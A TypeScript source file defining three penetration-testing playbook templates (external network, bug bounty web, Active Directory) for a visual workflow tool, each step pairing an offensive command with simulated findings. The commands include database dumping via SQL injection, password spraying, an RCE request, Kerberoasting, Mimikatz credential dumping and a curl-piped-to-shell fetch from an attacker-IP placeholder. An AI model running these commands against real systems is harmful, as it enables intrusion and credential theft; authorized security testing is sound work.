/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { WorkflowTemplate } from '@/components/phantom/types';

export const WORKFLOW_TEMPLATES: WorkflowTemplate[] = [
  {
    name: 'External Pentest Playbook',
    description: 'Comprehensive workflow simulating external footprinting, vulnerability detection, and entry points, connecting passive/active recon to target shells.',
    category: 'Network Pentesting',
    nodes: [
      {
        id: 'node-ext-1',
        title: 'Nmap - Initial Service Scan',
        description: 'Comprehensive port scan scanning common TCP ports with script auditing and service version detection.',
        type: 'discovery',
        tool: 'Nmap',
        state: 'success',
        commandTemplate: 'nmap -sCV -p- --min-rate 5200 $TARGET -oN nmap_init.txt',
        customParams: { '$PORT': '80,443,445,8080' },
        evidenceProduced: {
          open_ports: [80, 443, 445],
          services: ['http', 'https', 'smb'],
          findings: 'Port 80/tcp open (Nginx 1.18)\nPort 443/tcp open (Nginx 1.18)\nPort 445/tcp open (Samba SMB)'
        },
        position: { x: 50, y: 250 },
        tags: ['recon', 'portscan', 'nmap'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'node-ext-2',
        title: 'FFUF - Directory Brute Force',
        description: 'Active directory fuzzing on identified web service port 80 to discover hidden files or admin panels.',
        type: 'web',
        tool: 'FFUF',
        state: 'running',
        commandTemplate: 'ffuf -u http://$TARGET:$PORT/FUZZ -w $WORDLIST -e .php,.html,.txt -ic',
        customParams: { '$PORT': '80', '$WORDLIST': '/usr/share/seclists/Discovery/Web-Content/common.txt' },
        evidenceProduced: {
          extracted_urls: ['http://$TARGET:80/admin/', 'http://$TARGET:80/api/config.php'],
          findings: 'Found secret endpoints:\n/admin/ (301)\n/api/config.php (200 - Empty Response)\n/login.php (200)'
        },
        position: { x: 350, y: 100 },
        tags: ['web', 'bruteforce', 'fuzzing'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'node-ext-3',
        title: 'SMBMap - Share Permissions',
        description: 'List shares and access permissions for Null Session or standard user credentials.',
        type: 'ad',
        tool: 'SMBMap',
        state: 'success',
        commandTemplate: 'smbmap -H $TARGET',
        customParams: {},
        evidenceProduced: {
          findings: 'Anonymous access allowed on share "anonymous_backups" (READ-ONLY)\nFiles:\n - db_dev.bak'
        },
        position: { x: 350, y: 400 },
        tags: ['smb', 'share-enum', 'active-directory'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'node-ext-4',
        title: 'SQLMap - Exploit Login Panel',
        description: 'Verify SQL injection vulnerability on login.php form parameters or API inputs.',
        type: 'exploitation',
        tool: 'SQLMap',
        state: 'pending',
        commandTemplate: 'sqlmap -u "http://$TARGET:80/login.php" --data="user=admin&pass=admin" -p user --batch --dump',
        customParams: {},
        evidenceProduced: {},
        position: { x: 650, y: 100 },
        tags: ['sql-injection', 'exploit', 'db-dump'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'node-ext-5',
        title: 'CrackMapExec SMB Exploit',
        description: 'Audit Samba or SMB credentials harvested from database backup to execute command injections.',
        type: 'ad',
        tool: 'CrackMapExec',
        state: 'pending',
        commandTemplate: 'crackmapexec smb $TARGET -u "$USER" -p "$PASSWORD" --sam --loggedon-users',
        customParams: { '$USER': 'admin', '$PASSWORD': 'Password123' },
        evidenceProduced: {},
        position: { x: 650, y: 400 },
        tags: ['smb', 'passwords', 'cme'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'node-ext-6',
        title: 'LinPEAS - Local Priv Esc Escalation',
        description: 'Execute automated local enumeration to escalate system access to root.',
        type: 'post-exploitation',
        tool: 'LinPEAS',
        state: 'pending',
        commandTemplate: 'curl -L http://$ATTACKER_IP/linpeas.sh | sh',
        customParams: {},
        evidenceProduced: {},
        position: { x: 950, y: 250 },
        tags: ['post-exploitation', 'privesc', 'root-access'],
        updatedAt: new Date().toISOString()
      }
    ],
    connections: [
      { id: 'conn-ext-1', sourceNodeId: 'node-ext-1', targetNodeId: 'node-ext-2' },
      { id: 'conn-ext-2', sourceNodeId: 'node-ext-1', targetNodeId: 'node-ext-3' },
      { id: 'conn-ext-3', sourceNodeId: 'node-ext-2', targetNodeId: 'node-ext-4' },
      { id: 'conn-ext-4', sourceNodeId: 'node-ext-3', targetNodeId: 'node-ext-5' },
      { id: 'conn-ext-5', sourceNodeId: 'node-ext-4', targetNodeId: 'node-ext-6' },
      { id: 'conn-ext-6', sourceNodeId: 'node-ext-5', targetNodeId: 'node-ext-6' }
    ]
  },
  {
    name: 'Bug Bounty Web Playbook',
    description: 'A visual directory, subdomain and technology identification playbook focused on wide-scope web vulnerabilities and discovery.',
    category: 'Bug Bounty',
    nodes: [
      {
        id: 'node-bb-1',
        title: 'Subdomain Enum - Knockpy & FFUF',
        description: 'Scan subdomains using wordlists to identify staging platforms, shadow IT, or web apps.',
        type: 'discovery',
        tool: 'FFUF',
        state: 'success',
        commandTemplate: 'ffuf -u http://$TARGET -H "Host: FUZZ.$TARGET" -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -fs 0',
        customParams: {},
        evidenceProduced: {
          findings: 'Staged subdomain found: dev.target.org (Size: 4210)\nAlternative Host: admin-test.target.org'
        },
        position: { x: 100, y: 200 },
        tags: ['subdomain', 'dns', 'virtualhost'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'node-bb-2',
        title: 'WhatWeb Technology Fingerprinting',
        description: 'Passive or active technological assessment of discovered subdomains to trace vulnerable web library versions.',
        type: 'web',
        tool: 'Whatweb',
        state: 'success',
        commandTemplate: 'whatweb -a 3 http://dev.$TARGET/',
        customParams: {},
        evidenceProduced: {
          findings: 'dev.target.org is running Wordpress 5.4.1\nPlugins detected: wp-file-manager, contact-form-7\nWebserver: Apache/2.4.41'
        },
        position: { x: 400, y: 100 },
        tags: ['fingerprint', 'recon', 'whatweb'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'node-bb-3',
        title: 'Nuclei Vuln Scanning',
        description: 'Run targeted critical/high CVE scans for WordPress plugins and staging web configuration leaks.',
        type: 'web',
        tool: 'Nuclei',
        state: 'running',
        commandTemplate: 'nuclei -u http://dev.$TARGET/ -t plugins/ -severity high,critical',
        customParams: {},
        evidenceProduced: {
          findings: '[wp-file-manager-rce] - dev.target.org - Exploit works. RCE endpoint: /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'
        },
        position: { x: 700, y: 100 },
        tags: ['vulnerability', 'nuclei', 'wordpress'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'node-bb-4',
        title: 'Custom Exploit - WP File Manager RCE',
        description: 'Send malicious multi-part requests to secure a reverse shell through the Wordpress File Manager RCE exploit.',
        type: 'exploitation',
        tool: 'Custom Exploit',
        state: 'pending',
        commandTemplate: 'curl -X POST -F "cmd=ls -la" http://dev.$TARGET/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',
        customParams: {},
        evidenceProduced: {},
        position: { x: 1000, y: 200 },
        tags: ['rce', 'exploitation', 'wordpress'],
        updatedAt: new Date().toISOString()
      }
    ],
    connections: [
      { id: 'conn-bb-1', sourceNodeId: 'node-bb-1', targetNodeId: 'node-bb-2' },
      { id: 'conn-bb-2', sourceNodeId: 'node-bb-2', targetNodeId: 'node-bb-3' },
      { id: 'conn-bb-3', sourceNodeId: 'node-bb-3', targetNodeId: 'node-bb-4' }
    ]
  },
  {
    name: 'Active Directory Infrastructure Playbook',
    description: 'Flowchart starting from local footholds. Explores credentials mapping, LDAP interrogation, bloodhound analysis, and domain takeover pathways.',
    category: 'Active Directory',
    nodes: [
      {
        id: 'node-ad-1',
        title: 'CrackMapExec - Domain Password Spraying',
        description: 'Conduct password sprays against identified users to find credentials or weak password defaults (e.g., Summer2026).',
        type: 'ad',
        tool: 'CrackMapExec',
        state: 'success',
        commandTemplate: 'crackmapexec smb $TARGET -u users.txt -p "Summer2026" --continue-on-success',
        customParams: {},
        evidenceProduced: {
          credentials: [
            { username: 'CORP\\svc_sql', password: 'Summer2026', service: 'smb/ldap' }
          ],
          findings: '[+] CORP\\svc_sql:Summer2026 (Pwn3d!) on target domain controller.'
        },
        position: { x: 100, y: 250 },
        tags: ['active-directory', 'passwordspray', 'cme'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'node-ad-2',
        title: 'BloodHound - Ingestor Collection',
        description: 'Gather complete active directory mapping relations via SharpHound LDAP collection tool.',
        type: 'ad',
        tool: 'BloodHound',
        state: 'running',
        commandTemplate: 'sharphound.exe -c All --domain corp.local --dc-ip $TARGET',
        customParams: {},
        evidenceProduced: {
          findings: 'Generated ZIP file containing JSON structural nodes of Kerberos Delegation, Domain Users, Group Memberships and OU containers.'
        },
        position: { x: 400, y: 150 },
        tags: ['bloodhound', 'active-directory', 'kerberos'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'node-ad-3',
        title: 'Metasploit - Kerberoasting Attack',
        description: 'Extract Kerberos ticket hashes for service accounts to crack offline and escalate to domain administration.',
        type: 'exploitation',
        tool: 'Metasploit',
        state: 'pending',
        commandTemplate: 'msfconsole -q -x "use auxiliary/admin/kerberos/kerberoast; set RHOSTS $TARGET; run"',
        customParams: {},
        evidenceProduced: {},
        position: { x: 700, y: 250 },
        tags: ['kerberoast', 'active-directory', 'metasploit'],
        updatedAt: new Date().toISOString()
      },
      {
        id: 'node-ad-4',
        title: 'Mimikatz - Credential Dumping',
        description: 'Dump LSASS passwords, passwords hashes, and Kerberos Gold Tickets on compromized domain administrators.',
        type: 'post-exploitation',
        tool: 'Mimikatz',
        state: 'pending',
        commandTemplate: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
        customParams: {},
        evidenceProduced: {},
        position: { x: 1000, y: 250 },
        tags: ['mimikatz', 'credential-dump', 'lsass'],
        updatedAt: new Date().toISOString()
      }
    ],
    connections: [
      { id: 'conn-ad-1', sourceNodeId: 'node-ad-1', targetNodeId: 'node-ad-2' },
      { id: 'conn-ad-2', sourceNodeId: 'node-ad-1', targetNodeId: 'node-ad-3' },
      { id: 'conn-ad-3', sourceNodeId: 'node-ad-3', targetNodeId: 'node-ad-4' }
    ]
  }
];
